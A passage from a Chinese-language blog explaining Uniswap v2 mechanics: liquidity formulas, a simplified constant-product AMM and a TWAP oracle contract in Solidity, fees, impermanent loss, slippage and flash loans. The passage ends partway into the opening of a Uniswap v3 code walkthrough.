title="公式"></a>公式</h3><p>流动性的表示</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802133554436.png" alt="image-20230802133554436"></p><p>添加流动性</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802133646569.png" alt="image-20230802133646569"></p><p>移除流动性</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802135058030.png" alt="image-20230802135058030"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;./IERC20.sol&quot;;</span><br><span class="line">// 不考虑手续费</span><br><span class="line">contract CPAMM&#123;</span><br><span class="line">    IERC20 public immutable token0; // 池子中的token0</span><br><span class="line">    IERC20 public immutable token1; // 池子中的token1</span><br><span class="line"></span><br><span class="line">    uint256 public reserve0; // 池子中的token0数量</span><br><span class="line">    uint256 public reserve1; // 池子中的token1数量</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply; // 总共的LPtoken数量</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    constructor(address _token0, address _token1) public&#123;</span><br><span class="line">        token0 = IERC20(_token0);</span><br><span class="line">        token1 = IERC20(_token1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address _to, uint256 _amount) private&#123;</span><br><span class="line">        balanceOf[_to] += _amount;</span><br><span class="line">        totalSupply += _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address _from, uint256 _amount) private&#123;</span><br><span class="line">        balanceOf[_from] -= _amount;</span><br><span class="line">        totalSupply -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _update(uint256 _reserve0, uint256 _reserve1) private &#123;</span><br><span class="line">        reserve0 = _reserve0;</span><br><span class="line">        reserve1 = _reserve1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address _tokenIn, uint256 _amountIn) external returns(uint256 amountOut)&#123;</span><br><span class="line">        require(_amountIn &gt; 0, &quot;Invalid Amount&quot;);</span><br><span class="line">        require(_tokenIn == address(token0) || _tokenIn == address(token1));</span><br><span class="line"></span><br><span class="line">        // 确定转进合约的币是token0还是token1</span><br><span class="line">        bool isToken0 = _tokenIn == address(token0);</span><br><span class="line">        (IERC20 tokenIn, IERC20 tokenOut) = isToken0 ? (token0,token1):(token1,token0);</span><br><span class="line">        // 确定池子中 X, Y 的数量</span><br><span class="line">        (uint256 reserveIn, uint256 reserveOut) = isToken0? (reserve0,reserve1) : (reserve1,reserve0);</span><br><span class="line"></span><br><span class="line">        // 转币到合约，操作之前记得approve</span><br><span class="line">        tokenIn.transferFrom(msg.sender,address(this),_amountIn);</span><br><span class="line">        // 计算输出的数量</span><br><span class="line">        amountOut = (_amountIn * reserveOut) / (reserveIn + _amountIn);</span><br><span class="line">        // 转币给用户</span><br><span class="line">        tokenOut.transfer(msg.sender,amountOut);</span><br><span class="line">        // 更新自己的余额表</span><br><span class="line">        _update(token0.balanceOf(address(this)), token1.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addLiquidity(uint256 _amount0, uint256 _amount1) external returns(uint256 shares)&#123;</span><br><span class="line">        require(_amount0 &gt; 0 &amp;&amp; _amount1 &gt; 0, &quot;Invalid value&quot;);</span><br><span class="line">        // 把 token0 和 token1 转入到合约, 操作之前记得先approve</span><br><span class="line">        token0.transferFrom(msg.sender, address(this), _amount0);</span><br><span class="line">        token1.transferFrom(msg.sender, address(this), _amount1);</span><br><span class="line">        // 计算并mint share给用户</span><br><span class="line">        if( reserve0 &gt; 0 || reserve1 &gt; 0)&#123; // 如果之前已经有人添加过流动性</span><br><span class="line">            require(_amount0 * reserve1 == _amount1 * reserve0, &quot;dy/dx != y/x&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(totalSupply == 0)&#123; // 第一次添加流动性</span><br><span class="line">            shares = _sqrt(_amount0 * _amount1);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            // 为了合约的安全，我们取小的哪个： shares的计算-添加流动性那里的公式</span><br><span class="line">            shares = _min(</span><br><span class="line">                (_amount0 * totalSupply) / reserve0 ,</span><br><span class="line">                (_amount1 * totalSupply) / reserve1 </span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        require(shares &gt; 0, &quot;share is zero&quot;);</span><br><span class="line">        _mint(msg.sender,shares);</span><br><span class="line">        // 更新余额表</span><br><span class="line">        _update(token0.balanceOf(address(this)), token1.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _sqrt(uint256 y) internal pure returns(uint256 z)&#123;</span><br><span class="line">        if(y &gt; 3)&#123;</span><br><span class="line">            z = y;</span><br><span class="line">            uint256 x = y / 2 + 1;</span><br><span class="line">            while(x &lt; z)&#123;</span><br><span class="line">                z = x;</span><br><span class="line">                x = ( y / x + x) / 2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else if( y != 0)&#123;</span><br><span class="line">            z = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _min(uint256 _x, uint256 _y) private pure returns(uint256)&#123;</span><br><span class="line">        return _x &gt; _y ? _y : _x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function removeLiquidity(uint256 _shares) external returns(uint256 amount0, uint256 amount1)&#123;</span><br><span class="line">        require(_shares &gt; 0, &quot;Invalid shares&quot;);</span><br><span class="line">        // 计算 dx 和 dy 的数量</span><br><span class="line">        amount0 = (_shares * reserve0) / totalSupply;</span><br><span class="line">        amount1 = (_shares * reserve1) / totalSupply;</span><br><span class="line">        // 销毁用户的share </span><br><span class="line">        _burn(msg.sender, _shares);</span><br><span class="line">        // 把两个币转回给用户</span><br><span class="line">        token0.transfer(msg.sender, amount0);</span><br><span class="line">        token1.transfer(msg.sender, amount1);</span><br><span class="line">        // 更新余额表</span><br><span class="line">        _update(token0.balanceOf(address(this)), token1.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="预言机"><a href="#预言机" class="headerlink" title="预言机"></a>预言机</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>其原理是在每个区块开始时累计两种代币的相对价格，这将允许其他以太坊合约可以获取任意时间段内两种代币的时间加权平均价格</p><p>1</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230503155140209.png" alt="image-20230503155140209"></p><p>2</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230503155326291.png" alt="image-20230503155326291"></p><p>3</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230503155719880.png" alt="image-20230503155719880"></p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>下面是实现的更新价格、获取价格的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.6.6;</span><br><span class="line"></span><br><span class="line">import &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;</span><br><span class="line">import &quot;@uniswap/lib/contracts/libraries/FixedPoint.sol&quot;;</span><br><span class="line">import &quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2OracleLibrary.sol&quot;;</span><br><span class="line">import &quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract UniswapV2TWAP &#123;</span><br><span class="line">    using FixedPoint for *; // 解决小数问题</span><br><span class="line"></span><br><span class="line">    uint public constant PERIOD = 1 hours; // 最小间隔时间</span><br><span class="line"></span><br><span class="line">    IUniswapV2Pair public immutable pair; // 池子的地址</span><br><span class="line">    address public immutable token0;</span><br><span class="line">    address public immutable token1;</span><br><span class="line"></span><br><span class="line">    uint public price0CumulativeLast; // token0累计价格</span><br><span class="line">    uint public price1CumulativeLast; // token1累计价格</span><br><span class="line">    uint public blockTimestampLast; // 上一次计算的时间</span><br><span class="line"></span><br><span class="line">    FixedPoint.uq112x112 public price0Average; // token0的平均价格</span><br><span class="line">    FixedPoint.uq112x112 public price1Average; // token1的平均价格</span><br><span class="line"></span><br><span class="line">    constructor(IUniswapV2Pair _pair) public &#123;</span><br><span class="line">        pair = IUniswapV2Pair(_pair);</span><br><span class="line">        token0 = _pair.token0();</span><br><span class="line">        token1 = _pair.token1();</span><br><span class="line">        price0CumulativeLast = _pair.price0CumulativeLast();</span><br><span class="line">        price1CumulativeLast = _pair.price1CumulativeLast();</span><br><span class="line">        (, , blockTimestampLast)= _pair.getReserves();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任何人都可以更新价格，项目方鼓励大家一起来更新价格</span><br><span class="line">    function update() external &#123;</span><br><span class="line">        // 找到当前累计的价格</span><br><span class="line">       (</span><br><span class="line">           uint price0Cumulative,</span><br><span class="line">           uint price1Cumulative,</span><br><span class="line">           uint32 blockTimestamp</span><br><span class="line">       ) = UniswapV2OracleLibrary.currentCumulativePrices(address(pair));</span><br><span class="line"></span><br><span class="line">       uint timeElapsed = blockTimestamp - blockTimestampLast;</span><br><span class="line">       require(timeElapsed &gt; 1 hours, &quot;time elapsed &lt; 1h&quot;);</span><br><span class="line"></span><br><span class="line">       price0Average = FixedPoint.uq112x112(</span><br><span class="line">           uint224((price0Cumulative - price0CumulativeLast) / timeElapsed)</span><br><span class="line">           );</span><br><span class="line">        price1Average = FixedPoint.uq112x112(</span><br><span class="line">           uint224((price1Cumulative - price1CumulativeLast) / timeElapsed)</span><br><span class="line">           );</span><br><span class="line"></span><br><span class="line">        price0CumulativeLast = price0Cumulative;</span><br><span class="line">        price1CumulativeLast = price1Cumulative;</span><br><span class="line">        blockTimestampLast = blockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 输入一定数量的token，得到多少另外一种token</span><br><span class="line">    function consult(address token, uint amountIn) external view returns(uint amountOut) &#123;</span><br><span class="line">           require(token == token0 || token == token1);</span><br><span class="line">           if (token == token0) &#123;</span><br><span class="line">               amountOut = price0Average.mul(amountIn).decode144();</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               amountOut = price1Average.mul(amountIn).decode144();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h2><p>如果是币币交换，那么要transferFrom一定的代币到合约，然后再swap。但是假如在这两步当中，其他人swap咋办？这个问题是不是因为交易的原子性，防止了这个问题呢</p><p>1.先转入代币<br>2.swap<br>有人在1.5步提前swap了</p><p>这个情形不会发生，因为1和2这两步是在同一个tx中，tx具有原子性，不会被1.5插队，这样的逻辑是吧？</p><p>答案：向合约发代币和调swap应该在一笔交易中，通常是前端调router合约实现的</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230427174318445.png" alt="image-20230427174318445"></p><p>自己调用也可以</p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230427174341340.png" alt="image-20230427174341340"></p><p>如果转token和调swap分开进行就是做慈善，转入token但没swap出代币会导致滑点偏移，会被套利机器人以最快速度转走</p><p><strong>代币兑换代币</strong></p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230301085151567.png" alt="image-20230301085151567"></p><p><strong>例子</strong></p><p>假如最初池子里有10ETH和500TokenCQ</p><ol><li>K = 10 * 500 = 5000</li><li>TokenCQ购买者发送：1ETH</li><li>手续费：1 * 0.25% = 0.0025ETH</li><li>ETH_POOL = 10 + 1 - 0.0025 = 10.9975 ETH</li><li>TokenCQ _POOL = 5000 / 10.9975 = 454.65 TokenCQ</li><li>购买者得到TokenCQ = 500 - 454.65 = 45.35 TokenCQ</li></ol><p>由于手续费会在计算后被添加到资金池中，所以不变量<code>K</code>会随着每次交易稍微变大，为流动性提供者提供系统性盈利。故此，不变量表示的是上次交易结束后<code>ETH_POOL（ETH 资金池） * TokenCQ_POOL（TokenCQ 资金池）</code>的值。</p><ol><li>ETH_POOL（ETH 资金池） = 10.9975 + 0.0025 = 11</li><li>Token_POOL（TokenCQ 资金池） = 454.65</li><li>K（新的不变量） = 11 * 454.65 = 5,001.15</li></ol><h2 id="手续费-amp-协议费"><a href="#手续费-amp-协议费" class="headerlink" title="手续费&amp;协议费"></a>手续费&amp;协议费</h2><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802154716973.png" alt="image-20230802154716973"></p><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802154822927.png" alt="image-20230802154822927"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;</span><br><span class="line">    address feeTo = IUniswapV2Factory(factory).feeTo();</span><br><span class="line">    // 如果是首次添加流动性，则不需要计算交易协议费</span><br><span class="line">    // 如果不是首次添加流动性，则需要交易协议费</span><br><span class="line">    feeOn = feeTo != address(0);</span><br><span class="line">    // KLast是上一次添加或者删除流动性时保存的</span><br><span class="line">    uint _kLast = kLast; // gas savings</span><br><span class="line">    if (feeOn) &#123;</span><br><span class="line">        if (_kLast != 0) &#123; // 删除流动性的时候，这个也会进入，因此也会返回协议费</span><br><span class="line">            uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));</span><br><span class="line">            uint rootKLast = Math.sqrt(_kLast);</span><br><span class="line">            if (rootK &gt; rootKLast) &#123;</span><br><span class="line">                uint numerator = totalSupply.mul(rootK.sub(rootKLast));</span><br><span class="line">                uint denominator = rootK.mul(5).add(rootKLast);</span><br><span class="line">                uint liquidity = numerator / denominator;</span><br><span class="line">                if (liquidity &gt; 0) _mint(feeTo, liquidity); // 将LP转给to地址</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (_kLast != 0) &#123; // 如果我们已经开启feeOn，如果想再次关掉feeOff的话，需要将KLast设置为0</span><br><span class="line">        kLast = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在UniswapV2Factory.sol中设置<code>setFeeTo()</code>和<code>setFeeToSetter()</code>：<code>setFeeTo()</code>用来协议费给到哪个地址，<code>setFeeToSetter()</code>用来转让管理权</p><h2 id="无常损失"><a href="#无常损失" class="headerlink" title="无常损失"></a>无常损失</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li>定义：向某个流动性挖矿池中提供流动性，移除流动性的时候，发现比“如果不提供流动性”赚得少（发现比“如果不提供流动性”亏得多），损失的量叫做无常损失</li></ul><ul><li>本质上，无常损失是提供流动性时发生的资金暂时损失/非永久性损失。之所以叫做非永久性损失，是因为只要在AMM中的代币相对价格恢复到其初始状态，那么，该损失就消失了。但是，这种情况很少发生。通常，无常损失会变成永久性损失，吞掉你的交易费用收入甚至导致负回报。</li></ul><ul><li>当AMM中的代币市场价格在涨或跌时，就会产生无常损失。波动越大，无常损失越大。</li><li>无常损失计算器：<a href="https://yieldfarmingtools.com/tools">计算器</a></li></ul><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>假设这个池子只有我提供流动性，”如果我没添加流动性“的意思是“池子流动性是另外一个人提供的”。由于LP只有我，因此池子中不管怎么变，里面的代币在我移除流动性的时候都是我的。</p><p>池子的ETH涨价：此时无常损失=244.58-240=4.58</p><div class="table-container"><table><thead><tr><th>行为</th><th>添加流动性</th><th>池子资产</th><th>池子中ETH价格</th><th>我的总资产</th></tr></thead><tbody><tr><td>我添加流动性</td><td>100DAI: 1ETH</td><td>100DAI,1ETH</td><td>1ETH=100DAI</td><td>100DAI+1ETH = 100DAI + 100DAI = 200DAI</td></tr><tr><td>有人在池子交换</td><td></td><td>120DAI,0.83ETH</td><td>1ETH=144.58DAI</td><td>120DAI+0.83ETH = 120DAI + 120DAI = 240DAI</td></tr><tr><td>如果我没添加流动性</td><td></td><td></td><td></td><td>100DAI + 1 ETH = 100DAI + 144.58DAI = 244.58DAI</td></tr></tbody></table></div><p>池子的ETH降价：此时无常损失=164-160=4</p><div class="table-container"><table><thead><tr><th>行为</th><th>添加流动性</th><th>池子资产</th><th>池子中ETH价格</th><th>我的总资产</th></tr></thead><tbody><tr><td>我添加流动性</td><td>100DAI: 1ETH</td><td>100DAI,1ETH</td><td>1ETH=100DAI</td><td>100DAI+1ETH = 100DAI + 100DAI = 200DAI</td></tr><tr><td>有人在池子交换</td><td></td><td>80DAI,1.25ETH</td><td>1ETH=64DAI</td><td>80DAI+1.25ETH=80DAI+80DAI=160DAI</td></tr><tr><td>如果我没添加流动性</td><td></td><td></td><td></td><td>100DAI+1ETH=100DAI+64DAI=164DAI</td></tr></tbody></table></div><h3 id="公式-2"><a href="#公式-2" class="headerlink" title="公式"></a>公式</h3><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802200016106.png" alt="image-20230802200016106"></p><h2 id="滑点"><a href="#滑点" class="headerlink" title="滑点"></a>滑点</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802160542321.png" alt="image-20230802160542321"></p><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230804171512272.png" alt="image-20230804171512272"></p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul><li>高交易量导致价格下滑</li><li>流动性低导致价格下滑</li></ul><h3 id="避免滑点"><a href="#避免滑点" class="headerlink" title="避免滑点"></a>避免滑点</h3><p>请记住，价格滑点发生在您确认交易和该交易在区块链上确认之间的时刻。如果区块链有大量交易支持，矿工会优先处理支付最多 gas 的交易。根据这个简单的事实，遵循一些非常有效的方法来减少滑点。</p><ul><li><p>使用更多的gas：使用快速 gas 支付意味着您的交易可以立即结算，从而减少滑点影响您交易的回旋余地。在试图计算出要支付多少 gas 时，有两个宝贵的资源是：</p><ul><li><p><a href="https://etherscan.io/gastracker">Etherscan 气体追踪器</a></p></li><li><p><a href="https://ethgasstation.info/">ETH加油站</a></p></li></ul></li></ul><ul><li>在lay 2解决方案上进行交易：如果您觉得价格下滑与您的交易得到确认的速度有很大关系，那么您就对了。由于第 2 层扩展解决方案的兴起，您无需支付更多费用即可获得快速交易。第 2 层具有相反的效果，使您的交易比在以太坊上便宜得多。</li></ul><ul><li>调整滑点容忍水平：大多数去中心化交易所都为您提供了调整滑点容忍度的选项。您可以针对不同情况增加或减少滑点容忍度百分比，以确保您的交易得到处理。<a href="https://app.uniswap.org/#/swap">Uniswap 让您可以通过点击掉期界面</a>上的设置符号轻松调整您的滑点。</li></ul><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230301105349360.png" alt="image-20230301105349360"></p><h2 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h2><p>在Uniswap v1，用户如果想使用XYZ购买ABC，则需要先将XYZ发送到合约才能收到ABC。这将给那些希望使用ABC购买XYZ的用户带来不便。比如，当Uniswap与其他合约出现套利机会时，用户可能希望使用ABC在别的合约购买XYZ；或者用户希望通过卖出抵押物来释放他们在Maker或Compound的头寸，以此偿还Uniswap的借款。</p><p>Uniswap v2增加了一个新特性，允许用户在支付费用前先收到并使用代币，只要他们在同一个交易中完成支付。swap方法会在转出代币和检查k值两个步骤之间，调用一个可选的用户指定的回调合约。一旦回调完成，Uniswap合约会检查当前代币余额，并且确认其满足k值条件（在扣除手续费后）。如果当前合约没有足够的余额，整个交易将被回滚。</p><p>用户可以只归还原始代币，而不需要执行交易操作。这个功能将使得任何人可以闪电借出Uniswap池子中的任意数量的代币（闪电贷手续费与交易手续费一致，都是0.30%）。</p><blockquote><p>注：闪电贷在DeFi领域非常实用，对于TVL较高的协议，协议可以通过闪电贷获取手续费收入。比如dYdX和Aave，都推出了闪电贷功能。Uniswap v2合约中的闪电贷与交易功能实际上使用同一个swap方法。</p></blockquote><h2 id="气体消耗"><a href="#气体消耗" class="headerlink" title="气体消耗"></a>气体消耗</h2><p>由于其简约的设计，Uniswap 的 gas 效率非常高。对于 ETH 到 ERC20 的交易，它使用的 gas 比 Bancor 少近 10 倍。它可以比 0x 更有效地执行 ERC20 到 ERC20 的交易，并且与 EtherDelta 和 IDEX 等链上订单簿交易所相比具有显着的气体减少。</p><div class="table-container"><table><thead><tr><th>Exchange</th><th>Uniswap</th><th>EtherDelta</th><th>Bancor</th><th>Radar Relay(0x)</th><th>IDEX</th><th>Airswap</th></tr></thead><tbody><tr><td>ETH to ERC20</td><td>46000</td><td>108000</td><td>440000</td><td>113000</td><td>143000</td><td>90000</td></tr><tr><td>ERC20 to ETH</td><td>60000</td><td>93000</td><td>403000</td><td>113000</td><td>143000</td><td>120000</td></tr><tr><td>ERC20 to ERC20</td><td>88000</td><td>/</td><td>538000</td><td>113000</td><td>/</td><td>/</td></tr><tr><td>WETH</td><td>/</td><td>/</td><td>/</td><td>/</td><td>/</td><td>/</td></tr></tbody></table></div><h2 id="自定义池"><a href="#自定义池" class="headerlink" title="自定义池"></a>自定义池</h2><p>附加功能<code>tokenToExchangeSwap()</code>和<code>tokenToExchangeTransfer()</code>增加了 Uniswap 的灵活性。这些函数将 ERC20 代币转换为 ETH，并尝试用<code>ethToTokenTransfer()</code>在用户输入的地址上进行转换。这允许 ERC20 到 ERC20 与来自不同工厂的自定义 Uniswap 交易所进行交易，只要它们实现适当的接口即可。自定义交易所可以有不同的曲线、经理、私人流动资金池、基于 FOMO 的庞氏骗局，或任何你能想到的。</p>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.uniswap_v3_code</title>
      <link href="/2023/08/05/03.Uniswap/09.uniswap_v3_code/"/>
      <url>/2023/08/05/03.Uniswap/09.uniswap_v3_code/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-v3-code"><a href="#uniswap-v3-code" class="headerlink" title="uniswap_v3_code"></a>uniswap_v3_code</h1><p>声明：转载自此<a href="https://paco0x.org/uniswap-v3-2/#%E4%BB%8E-token-%E6%95%B0%E8%AE%A1%E7%AE%97%E6%B5%81%E5%8A%A8%E6%80%A7-l">大佬</a>。</p><h2 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h2><p>Uniswap v3 在代码层面的架构和 v2 基本保持一致，将合约分成了两个仓库：</p><ul><li><a href="https://github.com/Uniswap/uniswap-v3-core">uniswap-v3-core</a><ul><li>UniswapV3Factory：提供创建 pool 的接口，并且追踪所有的 pool</li><li>UniswapV3Pool：实现代币交易，流动性管理，交易手续费的收取，oracle 数据管理等，相当于V2的pair</li></ul></li><li><a href="https://github.com/Uniswap/uniswap-v3-periphery">uniswap-v3-periphery</a><ul><li>SwapRouter：提供代币交易的接口，它是对 UniswapV3Pool 合约中交易相关接口的进一步封装，前端界面主要与这个合约来进行对接</li><li>NonfungiblePositionManager：用来增加/移除/修改 Pool 的流动性，并且通过 NFT token 将流动性代币化。使用 ERC721 token（v2 使用的是 ERC20）的原因是同一个池的多个流动性并不能等价替换（v3 的集中流性动功能）。</li></ul></li></ul><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805134252531.png" alt="image-20230805134252531"></p><h2 id="创建交易对"><a href="#创建交易对" class="headerlink" title="创建交易对"></a>创建交易对</h2><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805141050510.png" alt="image-20230805141050510"></p><p>1.调用NonfungiblePositionManager合约的父合约PoolInitializer的<code>createAndInitializePoolIfNecessary()</code>方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function createAndInitializePoolIfNecessary(</span><br><span class="line">        address token0,</span><br><span class="line">        address token1,</span><br><span class="line">        uint24 fee,</span><br><span class="line">        uint160 sqrtPriceX96</span><br><span class="line">    ) external payable override returns (address pool) &#123;</span><br><span class="line">    // 排序token</span><br><span class="line">        require(token0 &lt; token1);</span><br><span class="line">        // 查看池子是否已经创建过了</span><br><span class="line">        // getPool的数据类型：mapping(address =&gt; mapping(address =&gt; mapping(uint24 =&gt; address))) public override getPool;</span><br><span 